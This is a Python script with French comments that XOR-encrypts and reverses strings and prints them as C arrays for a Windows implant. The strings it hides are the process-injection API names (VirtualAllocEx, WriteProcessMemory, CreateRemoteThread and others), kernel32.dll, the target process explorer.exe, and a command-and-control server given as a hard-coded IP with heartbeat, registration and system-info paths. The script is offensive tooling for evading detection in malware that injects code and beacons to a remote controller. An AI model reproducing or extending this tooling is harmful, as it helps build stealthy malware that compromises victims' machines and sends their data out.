#!/usr/bin/env python3
"""
Script pour générer des chaînes XOR chiffrées (Polyalphabétique) + reversées
"""
import argparse
import re
import sys

def xor_encrypt(text, key_bytes):
    """
    Chiffre avec une clé multi-octets (Polyalphabétique).
    key_bytes doit être une liste ou un bytearray (ex: [0xDE, 0xAD, 0xBE, 0xEF])
    """
    encrypted = []
    key_len = len(key_bytes)
    
    for i, char in enumerate(text):
        # On boucle sur la clé avec le modulo
        current_key = key_bytes[i % key_len]
        encrypted.append(ord(char) ^ current_key)
        
    return encrypted

def generate_c_array(name, text, key_bytes):
    """Génère un tableau C avec chiffrement XOR multi-octets + reverse"""
    
    # Étape 1: XOR encryption (avec null terminator inclus)
    # Note: On chiffre aussi le \0 final pour que tout soit obfusqué
    encrypted = xor_encrypt(text + '\0', key_bytes)

    # Étape 2: Reverse (Logique originale préservée: \0 au début, reste inversé)
    # [Last byte] + [Rest reversed]
    reversed_encrypted = encrypted[-1:] + encrypted[-2::-1]

    # Génération du code C
    hex_values = ', '.join(f'0x{b:02x}' for b in reversed_encrypted)
    
    # Affichage de la clé utilisée en commentaire pour référence
    key_hex = ''.join(f'{k:02X}' for k in key_bytes)

    print(f"// Original: {text}")
    print(f"// Key: 0x{key_hex}")
    print(f"unsigned char encrypted{name}[] = {{")
    print(f"    {hex_values}")
    print(f"}};")
    print(f"unsigned int {name}_len = sizeof(encrypted{name});")
    print()


# Définition des clés plus complexes (4 octets)
# Vous pouvez changer ces valeurs pour n'importe quelle suite d'octets
API_KEY  = [0x35] 
PROCESS_KEY  = [0x12, 0x34, 0x56, 0x78]
C2_KEY   = [0x9A, 0xF2, 0x18, 0x4C]

def main():
    print("// ========================================")
    print("// ENCRYPTED + REVERSED API STRINGS (PolyXOR)")
    print("// ========================================\n")

    # Windows API Functions
    api_functions = [
        ("VirtualAllocEx", "VirtualAllocEx"),
        ("OpenProcess", "OpenProcess"),
        ("VirtualProtectEx", "VirtualProtectEx"),
        ("WriteProcessMemory", "WriteProcessMemory"),
        ("CreateRemoteThread", "CreateRemoteThread"),
        ("GetModuleHandleA", "GetModuleHandleA"),
        ("GetProcAddress", "GetProcAddress"),
    ]

    # DLL names
    dll_names = [
        ("Kernel32", "kernel32.dll"),
    ]

    c2_endpoint = [
        ("162.19.242.23", "/heartbeat/register", "/heartbeat", "/api/agent/system-info")
    ]

    print("// === API Functions ===")
    for name, text in api_functions:
        generate_c_array(name, text, API_KEY)

    print("\n// === DLL Names ===")
    for name, text in dll_names:
        generate_c_array(name, text, API_KEY)

    # Process names (clé différente)
    print("\n// === Process Names (Key: Process_Key) ===")
    generate_c_array("explorer_exe", "explorer.exe", PROCESS_KEY)

    # C2 Endpoints (clé différente)
    print("\n// === C2 Endpoints (Key: C2_Key) ===")
    for item in c2_endpoint:
        ip = item[0]
        paths = item[1:]
        # On traite l'IP
        generate_c_array(f"C2_IP", ip, C2_KEY)
        # On traite les chemins
        for i, text in enumerate(paths):
            generate_c_array(f"C2_Path_{i+1}", text, C2_KEY)

    print("\n// === Usage Example (C Implementation logic) ===")
    print("// Vous devez mettre à jour votre déchiffreur C pour utiliser une clé tableau :")
    print("// unsigned char key[] = { 0xDE, 0xAD, 0xBE, 0xEF };")
    print("// decrypt_poly_xor(encryptedVirtualAllocEx, len, key, 4);")

if __name__ == "__main__":
    main()